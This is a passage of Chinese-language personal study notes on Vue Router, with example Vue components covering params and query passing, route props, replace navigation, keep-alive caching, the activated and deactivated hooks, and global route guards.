   ~~~

   3. 接收参数

      ~~~vue
      $route.params.id
      $route.params.title
      ~~~

      `src/router/index.js`

      ~~~js
      import VueRouter from "vue-router";
      import Home from '../pages/Home'
      import About from '../pages/About'
      import News from '../pages/News'
      import Message from '../pages/Message'
      import Detail from '../pages/Detail'
      
      export default new VueRouter({
          routes:[
              {
                  path:'/about',
                  component:About
              },
              {
                  path:'/home',
                  component:Home,
                  children:[
                      {
                          path:'news',
                          component:News
                      },
                      {
                          path:'message',
                          component:Message,
                          children:[
                              {
                                  name:'xiangqing',
                                  path:'detail/:id/:title',	// 使用占位符声明接收params参数
                                  component:Detail
                              }
                          ]
                      }
                  ]
              }
          ]
      })
      ~~~

      `src/pages/Message.vue`

      ~~~vue
      <template>
          <div>
              <ul>
                  <li v-for="m in messageList" :key="m.id">
                    
                      <!-- 跳转路由并携带params参数，to的字符串写法 -->
                      <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">
                          {{m.title}}
                      </router-link>&nbsp;&nbsp; -->
      
                      <!-- 跳转路由并携带params参数，to的对象写法 -->
                      <router-link :to="{
                          name:'xiangqing',
                          params:{
                              id:m.id,
                              title:m.title
                          }
                      }">
                          {{m.title}}
                      </router-link>&nbsp;&nbsp;
                  </li>
              </ul>
              <hr/>
              <router-view></router-view>
          </div>
      </template>
      
      <script>
          export default {
              name:'News',
              data(){
                  return{
                      messageList:[
                        {id:'001',title:'消息001'},
                        {id:'002',title:'消息002'},
                        {id:'003',title:'消息003'}
                      ]
                  }
              }
          }
      </script>
      ~~~

      `src/pages/Detail.vue`

      ~~~vue
      <template>
        <ul>
          <li>消息编号：{{ $route.params.id }}</li>
          <li>消息标题：{{ $route.params.title }}</li>
        </ul>
      </template>
      
      <script>
          export default {
              name:'Detail'
          }
      </script>
      ~~~

      ## 路由的props配置

      ==<font color='red'>props</font>==作用：让路由组件更方便的收到参数

      ~~~js
      {
      	name:'xiangqing',
      	path:'detail/:id',    //写错了 query不能使用占位符   遇到错误来看吧
      	component:Detail,
      
      	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
      	// props:{a:900}
      
      	//第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件
      	// props:true
      	
      	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
      	props($route){
      		return {
      			id: $route.query.id,
      			title: $route.query.title
      		}
      	}
      }
      ~~~

      `src/router/index.js`

      ~~~js
      
      import VueRouter from "vue-router";
      import Home from '../pages/Home'
      import About from '../pages/About'
      import News from '../pages/News'
      import Message from '../pages/Message'
      import Detail from '../pages/Detail'
      
      export default new VueRouter({
        routes:[
          {
            path: '/about',
            component: About
          },
          {
            path:'/home',
            component:Home,
            children:[
              {
                path:'news',
                component:News
              },
              {
                path:'message',
                component:Message,
                children:[
                  {
                    name:'xiangqing',
                    path:'detail/:id/:title',
                    component:Detail,
                    // props的第一种写法，值为对象，
                    // 该对象中的所有key-value都会以props的形式传给Detail组件
                    // props:{a:1,b:'hello'}
      
                    // props的第二种写法，值为布尔值，
                    // 若布尔值为真，会把该路由组件收到的所有params参数，以props的形式传给Detail组件
                    // props:true
      
                    // props的第三种写法，值为函数
                    props(params) { // 这里可以使用解构赋值
                      return {
                        id: params.id,
                        title: params.title,
                      }
                    }
                  }
                ]
              }
            ]
          }
        ]
      })
      ~~~

      ~~~vue
      <template>
      	<div>
          <ul>
            <li v-for="m in messageList" :key="m.id">
              <router-link :to="{
                      name:'xiangqing',
                      params:{
                          id:m.id,
                          title:m.title
                      }
               }">
                	{{m.title}}
        			</router-link>&nbsp;&nbsp;
        		</li>
        	</ul>
          <hr/>
          <router-view></router-view>
        </div>
      </template>
      
      <script>
          export default {
              name:'News',
              data(){
                  return{
                      messageList:[
                          {id:'001',title:'消息001'},
                          {id:'002',title:'消息002'},
                          {id:'003',title:'消息003'}
                      ]
                  }
              }
          }
      </script>
      ~~~

      `src/pages/Detail.vue`

      ~~~vue
      <template>
          <ul>
              <li>消息编号：{{ id }}</li>
              <li>消息标题：{{ title }}</li>
          </ul>
      </template>
      
      <script>
          export default {
              name:'Detail',
              props:['id','title']
          }
      </script>
      ~~~

      <font size="24px" color='red'>**总结**</font>

      >1.query使用name和pah传参都可以,但是params只能使用name传参
      >
      >2.params不再路由配参数的话,当用户刷新当前页面的时候,参数就会消失
      >
      >3.query相当于get请求,而params相当于post请求
      >
      >​	query传过来的参数会在地址栏中显示,而params传过来的参数不会显示到地址栏中
      >
      >4.接收参数的时候使用`this.$route.query.name` 或者`this.$route.params.name`

# Vue Router replace 编程式导航 缓存路由组件

## 路由跳转的replace方法

1. 作用:**控制路由跳转时操作浏览器历史记录的模式**

2. 浏览器的历史记录有两种写入方式:==push==和==replace==

   ==<font color='red'>push</font>==是追加历史记录

   ==<font color='red'>replace</font>==是替换当前记录,路由跳转时候默认为==push==方式

3. 开启==replace==模式

​		==<router-link <font color='red'>:replace=“true” </font>…>News</router-link>==

​		简写:<router-link <font color='red'>replace</font>…>News</router-link>

总结:浏览器记录本质是一个栈,默认==push==,点开新页面就会在栈顶追加一个地址,后退,栈顶指针向下移动,改为==replace==就是不追加,而将栈顶地址替换

`src/pages/Home.vue`

~~~vue
<template>
  <div>
    <h2>Home组件内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link replace class="list-group-item" active-class="active" 
                       to="/home/news">News</router-link>
    		</li>
        <li>
          <router-link replace class="list-group-item" active-class="active" 
                       to="/home/message">Message</router-link>
    		</li>
    </ul>
    <router-view></router-view>
    </div>
  </div>
</template>

<script>
  export default {
    name:'Home'
  }
</script>
~~~

## 编程式路由导航(不用<router-link>)

作用:不借助==<router-link>==实现路由跳转,让路由跳转更加零花

this.$router.==<font color='red'>push({})</font>==			内传的对象与==<router-link>==中的==to==相同

this.$router.==<font color='red'>replace({})</font>==

this.$router.==<font color='red'>forward()	</font>==		前进

this.$router.==<font color='red'>back()</font>==					后退

this.$router.==<font color='red'>go(n)</font>==						可前进也可后退,n为正数前进n,为负数后退

~~~js
this.$router.push({
	name:'xiangqing',
  params:{
    id:xxx,
    title:xxx
  }
})

this.$router.replace({
	name:'xiangqing',
  params:{
    id:xxx,
    title:xxx
  }
})
~~~

![编程式导航1](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//编程式导航1.png)

`src/components/Banner.vue`

~~~vue
<template>
	<div class="col-xs-offset-2 col-xs-8">
		<div class="page-header">
			<h2>Vue Router Demo</h2>
			<button @click="back">后退</button>
			<button @click="forward">前进</button>
			<button @click="test">测试一下go</button>
		</div>
	</div>
</template>

<script>
	export default {
		name:'Banner',
		methods:{
			back(){
				this.$router.back()
			},
			forward(){
				this.$router.forward()
			},
			test(){
				this.$router.go(3)
			}
		},
	}
</script>
~~~

`src/pages/Message.vue`

~~~vue
<template>
    <div>
        <ul>
            <li v-for="m in messageList" :key="m.id">
                <router-link :to="{
                    name:'xiangqing',
                    params:{
                        id:m.id,
                        title:m.title
                    }
                }">
                    {{m.title}}
                </router-link>
                <button @click="showPush(m)">push查看</button>
                <button @click="showReplace(m)">replace查看</button>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                messageList:[
                    {id:'001',title:'消息001'},
                    {id:'002',title:'消息002'},
                    {id:'003',title:'消息003'}
                ]
            }
        },
        methods:{
            showPush(m){
                this.$router.push({
                    name:'xiangqing',
                    query:{
                        id:m.id,
                        title:m.title
                    }
                })
            },
            showReplace(m){
                this.$router.replace({
                    name:'xiangqing',
                    query:{
                        id:m.id,
                        title:m.title
                    }
                })
            }
        }
    }
</script>
~~~

## 缓存路由组件

作用:让不展示路由的组件保持挂载,不被销毁

<keep-alive include="News"><router-view></router-view></keep-alive>

<keep-alive include="[‘News’,’message’]"><router-view></router-view></keep-alive>

~~~vue
// 缓存一个路由组件
<keep-alive include="News"> // include中写想要缓存的组件名，不写表示全部缓存
    <router-view></router-view>
</keep-alive>

// 缓存多个路由组件
<keep-alive :include="['News','Message']"> 
    <router-view></router-view>
</keep-alive>
~~~

![路由缓存](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//路由缓存.png)

`src/pages/News.vue`

~~~vue

<template>
    <ul>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News'
    }
</script>
~~~

`src/pages/Home.vue`

~~~vue
<template>
  <div>
    <h2>Home组件内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li><router-link replace class="list-group-item" active-class="active" 
                       to="/home/news">News</router-link></li>
        <li><router-link replace class="list-group-item" active-class="active" 
                       to="/home/message">Message</router-link></li>
    	</ul>
      <keep-alive include="News">    <!-- 让news页面跳转后不销毁,在后台缓存 -->
        <router-view></router-view>
    	</keep-alive>
    </div>
  </div>
</template>

<script>
    export default {
        name:'Home'
    }
</script>
~~~

# Vue Router activated deactivated 路由守卫

## activated deactivated

==activated==和==deactivated==是路由组件所独有的两个钩子,用于捕获路由组件的激活状态

具体使用

1. ==<font color='red'>activated</font>==路由组件被激活时触发
2. ==<font color='red'>deactivated</font>==路由组件失活时触发

![路由钩子activated和deactivated](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//路由钩子activated和deactivated.gif)

`src/pages/News.vue`

~~~vue
<template>
    <ul>
        <li :style="{opacity}">欢迎学习vue</li>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                opacity:1
            }
        },
        activated(){
            console.log('News组件被激活了')
            this.timer = setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
        deactivated(){
            console.log('News组件失活了')
            clearInterval(this.timer)
        }
    }
</script>
~~~

## 路由守卫

作用：对路由进行权限控制

分类：全局守卫、独享守卫、组件内守卫

1. 全局守卫

   ==<font color='red'>meta</font>==路由源信息

   ~~~js
   // 全局前置守卫：初始化时，每次路由切换前执行
   router.beforeEach((to,form,next)=>{
     console.log('beforeEach',to,form)
     if(to.meta.isAuth){   //判断当前路由是否需要进行权限控制
       if(localStorage.getItem('school')==='atguigu'){			// 权限控制的具体规则
         next() //放行
       }else{
         alert('没权限查看快滚')
       }
     }else{
       next()  // 放行
     }
   })
   
   
   // 全局后置守卫：初始化时、每次路由切换后执行
   router.afterEach((to,from)=>{
     console.log('afterEach',to,from)
     if(to.meta.title){
       document.title = to.meta.title  //修改网页的title
     }else{
       document.title = 'vue-test'
     }
   })
   ~~~

   
